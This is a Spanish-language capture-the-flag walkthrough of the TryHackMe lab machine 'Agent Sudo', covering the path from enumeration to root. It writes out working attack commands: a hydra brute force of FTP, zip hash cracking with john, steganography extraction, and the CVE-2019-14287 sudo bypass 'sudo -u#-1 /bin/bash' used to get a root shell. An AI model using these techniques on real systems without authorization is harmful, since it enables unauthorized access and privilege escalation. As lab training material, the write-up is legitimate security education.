## 🕵️‍♂️ Agent Sudo — Walkthrough (TryHackMe)

Nivel: Easy — Privilege escalation / Enumeration local

Plataforma: TryHackMe — Máquina: Agent Sudo


### 📖 Introducción

En este CTF trabajaremos sobre la máquina Agent Sudo. 

El reto se centra en la enumeración cuidadosa del sistema, descubrimiento de servicios y ficheros expuestos, explotación de vulnerabilidades o malas configuraciones y finalmente escalado de privilegios (privilege escalation) para obtener acceso root.

La metodología que seguiremos es la clásica de pentesting/CTF:

Reconocimiento de red — comprobar accesibilidad de la máquina objetivo (ping, ARP, etc.).

Escaneo de puertos y servicios — nmap exhaustivo y scripts relevantes.

Enumeración de servicios — web, SMB, SSH, etc. según aparezcan.

Explotación / Credenciales — probar vectores (vulnerabilidades, credenciales encontradas, archivos con permisos inseguros).

Escalado de privilegios — enumerar privilegios locales, sudoers, binarios con SUID, etc.

Limpieza y documentación — capturas, notas y conclusiones.

## Paso 1 — Reconocimiento de red (Comprobación de conectividad)

Objetivo: Verificar que la máquina objetivo responde y está accesible.

Comando ejecutado:

ping -c 4 10.10.71.80

Salida (captura incluida):

<img width="588" height="338" alt="Ping" src="https://github.com/user-attachments/assets/6b9c7374-b539-4cb6-866c-cd2ef6c76959" />


Interpretación:

La IP 10.10.71.80 responde a ICMP, por lo que está en línea y accesible desde nuestra VPN/entorno. 

Tiempo de respuesta ~41 ms. Con esto confirmamos que podemos proceder al escaneo de puertos y servicios.


## Paso 2 — Escaneo con nmap

Objetivo: Identificar puertos abiertos y servicios en ejecución para orientar la enumeración.

Comando ejecutado:

nmap -sV -sC -T4 -o nmap_scan 10.10.71.80

Salida (captura incluida):

<img width="815" height="333" alt="Nmap" src="https://github.com/user-attachments/assets/853965e3-d037-4b06-88de-63d916db9759" />


Interpretación:

Puerto 21 (FTP): vsftpd 3.0.3 — FTP activo. Probar si permite conexión anónima (anonymous) y listar archivos. 

Algunas versiones de vsftpd tienen fallos, pero la famosa backdoor pertenece a la versión 2.3.4; aun así, la presencia de FTP sugiere archivos útiles o credenciales en texto plano.

Puerto 22 (SSH): OpenSSH 7.6p1 — servicio SSH activo. No podemos intentar fuerza bruta sin permiso en un entorno real, pero en CTF es común que encontremos credenciales en archivos accesibles (FTP, web, backups) o logins reutilizados.

Puerto 80 (HTTP): Apache/2.4.29 con título de página "Announcement" — acceder en el navegador y enumerar directorios con gobuster/ffuf y escanear con nikto para posibles vectores web.


## Paso 3 — Enumeración web (HTTP) — Acceso condicionado por User‑Agent

Objetivo: Acceder al contenido web al que solo se permite acceso si la petición incluye un User‑Agent concreto ("tu codename").

Observación: Al visitar http://10.10.71.80 en el navegador vemos el mensaje:

"Use your own codename as user‑agent to access the site."

<img width="687" height="250" alt="Pagina puerto 80" src="https://github.com/user-attachments/assets/1fec6b3f-dd0f-4bbd-a995-c0961d626bb5" />


## Paso 4 — Pruebas con distintos User‑Agents (curl)

Objetivo: Determinar qué User‑Agent acepta el servidor para mostrar contenido o respuestas distintas.

Comandos ejecutados y salidas clave:

### Probando User‑Agent: A:

<img width="626" height="321" alt="Curl letra A" src="https://github.com/user-attachments/assets/f4253f95-d2ee-42e0-b26d-a3eaa7d5fe8b" />


### Probando User‑Agent: B:

<img width="587" height="316" alt="Curl letra B" src="https://github.com/user-attachments/assets/bf75e76d-f6c5-4145-8634-894481fddb35" />


### Probando User‑Agent: R:

<img width="794" height="334" alt="Curl letra R" src="https://github.com/user-attachments/assets/94a537ee-9458-4cd8-8bc5-91bb6e717768" />


Interpretación:

Con valores genéricos (A, B) el servidor devuelve la página por defecto que pide usar un "codename" como User‑Agent.

Con User‑Agent: R el servidor devuelve además una advertencia textual: What are you doing! Are you one of the 25 employees? If not, I going to report this incident, 

esto indica que el servidor está verificando el User‑Agent y que la letra R coincide con alguna condición interna.


## Paso 5 — Prueba con User-Agent: C — descubrimiento de usuario

Comando ejecutado:

curl -A "C" -L 10.10.71.80

Salida (fragmento relevante):

Attention 'chris',

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak!

<img width="1115" height="103" alt="Curl letra C uusario encontrado" src="https://github.com/user-attachments/assets/225692eb-160f-412f-997e-38200a343278" />


Interpretación:

El servidor responde con un mensaje dirigido a chris. Hemos descubierto un posible nombre de usuario (chris) y la indicación clara de que la contraseña es débil.

Esto es una pista típica en CTFs que nos indica que el siguiente vector lógico es probar acceso con el usuario chris (SSH/FTP) y/o realizar un ataque de diccionario dirigido a ese usuario.


## Paso 6 — Fuerza bruta contra FTP con hydra (obtención de credenciales)

Objetivo: Probar contraseñas comunes para el usuario chris en el servicio FTP y obtener acceso.

Comando ejecutado:

hydra -l chris -P /home/quiqu3h4ck/rockyou.txt 10.10.71.80 ftp

Salida (resumen):

<img width="1267" height="194" alt="Hydra para descifrar clave" src="https://github.com/user-attachments/assets/860b753b-4043-48f5-8aa7-80afe97d9f94" />


Hydra terminó indicando 1 objetivo completado y 1 contraseña válida encontrada para el servicio ftp en 10.10.71.80.


## Paso 7 — Conexión FTP y descarga de archivos

Objetivo: Conectarse al servicio FTP con las credenciales obtenidas y descargar los ficheros disponibles para su análisis.

Comandos ejecutados:

ftp 10.10.71.80

usuario: chris

contraseña: la encotrada por hydra

ftp> ls
ftp> mget *

Salida (resumen / evidencias):

Conexión establecida correctamente: 230 Login successful.

Listado de ficheros remotos:

To_agentJ.txt (217 bytes)

cute-alien.jpg (33143 bytes)

cutie.png (34842 bytes)

Se descargaron todos los archivos con mget * a la máquina atacante.

<img width="1273" height="629" alt="ftp descargar ficheros" src="https://github.com/user-attachments/assets/900bfaa0-5b3b-4cab-99ce-6f0ba2c74400" />


Interpretación:

El fichero To_agentJ.txt (pequeño, ~217 bytes) es la prioridad para buscar pistas (credenciales, instrucciones, rutas internas, nombres de usuario). 

Las imágenes pueden contener steganografía o pistas visuales, pero inicialmente nos centraremos en el fichero de texto.


## Paso 8 — Análisis de imágenes (binwalk) y extracción de archivo ZIP embebido

Objetivo: Detectar y extraer datos ocultos dentro de las imágenes descargadas (steganografía o archivos embebidos).

Comando ejecutado (detectar firmas con binwalk):

binwalk cutie.png
binwalk -e cutie.png

Salida (resumen / evidencias):

binwalk detectó dentro de cutie.png datos Zlib y un ZIP archive data, encrypted con nombre To_agentR.txt.

En algunos entornos binwalk -e puede fallar al intentar invocar extractores externos (por ejemplo jar) si no están instalados; la salida indica que la extracción automática no se completó.

<img width="1289" height="490" alt="buscamos archivos ocultos con binwalk" src="https://github.com/user-attachments/assets/dc1b8b98-c753-4f56-927c-be16b926ecaa" />


Interpretación:

La imagen cutie.png contiene un ZIP embebido (comprimido y cifrado) que incluye un fichero llamado To_agentR.txt.

Necesitamos extraer el bloque de bytes que contiene el ZIP y luego intentar abrirlo o crackear su contraseña.


## Paso 9 — Recuperación y crackeo del ZIP embebido (resultado)

Acción realizada: Entramos al directorio generado por binwalk (_cutie.png.extracted) y localizamos el archivo ZIP extraído (8702.zip).

Comandos ejecutados:

zip2john 8702.zip > zip.hash

john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt

Salida / Resultado:

zip2john generó el hash en zip.hash.

john procesó el hash y encontró la contraseña: alien (mostrada por john).

Archivo interno identificado: 8702.zip/To_agentR.txt.

<img width="823" height="499" alt="descifrando con zip2john" src="https://github.com/user-attachments/assets/3b599c6c-41eb-4151-9dcf-e352bfe59dfa" />


## Paso 10 — Extracción del archivo y verificación (7z)

Acción realizada: Se extrajo 8702.zip usando 7z con la contraseña alien. La extracción reportó éxito y el archivo interno To_agentR.txt (86 bytes) quedó disponible.

Comando ejecutado:

7z x 8702.zip

Salida (resumen):

7‑Zip confirma que la extracción fue correcta: Everything is Ok.

Tamaño del fichero interno: 86 bytes (comprimido 280 bytes en el zip).

<img width="698" height="351" alt="extraer el archivo" src="https://github.com/user-attachments/assets/5fd25154-b036-4f93-8cc5-3ac4c756a508" />


## Paso 11 — Lectura del fichero To_agentR.txt y decodificación de pista

Contenido del fichero (To_agentR.txt):

Agent C,


We need to send the picture to 'QXJlYTUx' as soon as possible!


By,
Agent R

<img width="628" height="256" alt="ahora leemos el fichero" src="https://github.com/user-attachments/assets/eecaa3f4-0ac7-43f1-893f-bc375465e1f6" />


Interpretación:

El valor encerrado entre comillas (QXJlYTUx) parece estar codificado en Base64. Decodificándolo obtenemos: Area51.

## ejemplo de decodificación (local):
echo 'QXJlYTUx' | base64 -d

output: Area51

## Con CyberChef:

<img width="399" height="556" alt="ciberchef descifrando" src="https://github.com/user-attachments/assets/2525c508-a2b9-4ee3-86e9-93c49ab72e82" />


El mensaje indica que debemos enviar la imagen (probablemente cute-alien.jpg o cutie.png) a la entidad/codename Area51.


## Paso 12 — Extracción de archivo oculto en cute-alien.jpg (stegano)

Objetivo: Buscar y extraer datos ocultos dentro de la imagen cute-alien.jpg usando steghide.

Comandos ejecutados:

steghide info cute-alien.jpg

steghide extract -sf cute-alien.jpg

cat message.txt

Salida / Resultado:

steghide info detectó un archivo adjunto interno llamado message.txt embebido en la imagen (algoritmo: rijndael-128, modo CBC).

steghide extract -sf cute-alien.jpg extrajo correctamente message.txt.

Al leer message.txt se obtuvo un mensaje de chris dirigido a james que contiene una contraseña para la cuenta james en la máquina objetivo.

<img width="632" height="204" alt="vemos arhivo adjutno en imagen cute-alien" src="https://github.com/user-attachments/assets/2f30dbd3-d721-4876-a636-1b454df310b7" />


<img width="715" height="246" alt="obtenemos password dentro del archivo para ssh" src="https://github.com/user-attachments/assets/dd8def16-06e2-4084-8725-a7197bd4aa73" />


## Paso 13 — Acceso SSH como james y recopilación de la bandera de usuario

Acción realizada: Nos conectamos por SSH a la máquina 10.10.71.80 usando james y la contraseña extraída del fichero message.txt.

Comando ejecutado:

ssh james@10.10.71.80

Salida / Resultado:

Al introducir la contraseña correcta, la sesión SSH abrió el shell de james en la máquina objetivo (Ubuntu 18.04.3 LTS).

En el home de james se encontró el fichero user_flag.txt.

Evidencia (comando y contenido de la bandera):

ls

cat user_flag.txt

user_flag.txt: 03d975e8c92a7c04146cfa7a5a313c7

<img width="817" height="546" alt="ssh a james" src="https://github.com/user-attachments/assets/47b5e11f-ccdc-4ad8-ac41-e8d680c22026" />

### Como se aprecia tambien hay una imagen en el directorio, con ella realiza una busqueda inversa en Google para contestar la pregunta.


<img width="1376" height="462" alt="busqueda inversa de imagen Alienautopsy" src="https://github.com/user-attachments/assets/7a8496e0-b904-4d1f-87f4-44ce45efb0dd" />


## Paso 14 — Enumeración de privilegios sudo y próximos pasos

Comandos ejecutados:

whoami

id

sudo -l

Salida (resumen):

whoami → james

id → uid=1000(james) gid=1000(james) groups=... (incluye sudo)

sudo -l mostró que James puede ejecutar /bin/bash con sudo según la regla:

User james may run the following commands on agent-sudo:
    (ALL, !root) /bin/bash

<img width="1001" height="188" alt="comprobamos permisos" src="https://github.com/user-attachments/assets/1b42d223-4833-4fd9-b723-10375f309d08" />


Interpretación cuidadosa:

La entrada (ALL, !root) /bin/bash indica que james está autorizado a ejecutar /bin/bash con sudo para todos los usuarios excepto root. 

La sintaxis exacta en sudoers puede variar, y a veces la representación es confusa.


## Paso 15 — Exploit local de sudo (CVE-2019-14287)

Contexto: Comprobamos la versión de sudo (sudo --version → Sudo version 1.8.21p2) y sudo -l muestra la regla (ALL, !root) /bin/bash. 

Esa combinación es susceptible al bypass documentado en CVE-2019-14287 en ramas 1.8.x previas a 1.8.28.

<img width="399" height="131" alt="version vulnerable" src="https://github.com/user-attachments/assets/2bab6dff-91a0-4e10-830b-27657052f800" />


<img width="811" height="250" alt="busqueda en goolge exploiit" src="https://github.com/user-attachments/assets/7f840489-3110-4795-ac77-d8429a544c1a" />



## Paso 16 — Escalado a root usando bypass numérico y obtención de la flag root

Acción realizada: Aprovechando la vulnerabilidad CVE-2019-14287 (bypass numérico de sudo) se ejecutó un shell /bin/bash como root usando la forma alternativa de -u.

Comando ejecutado (ejemplo que funcionó):

### bypass numérico que fuerza ejecución como root
sudo -u#-1 /bin/bash

### o, equivalente mostrado en la captura:
sudo -u \#\$((0xffffffff)) /bin/bash

Verificación y obtención de la flag root:

whoami    output: root
cat /root/root.txt

Resultado (flag de root):

<img width="892" height="325" alt="segunda flag escalada de privilegios" src="https://github.com/user-attachments/assets/4ca5757b-03a2-4e34-ad4e-a87ef9bb17ca" />


Interpretación y nota final:

La máquina fue rooteada con éxito usando el bypass de sudo. Se obtuvo la flag de root y se comprobó la escalada con whoami.

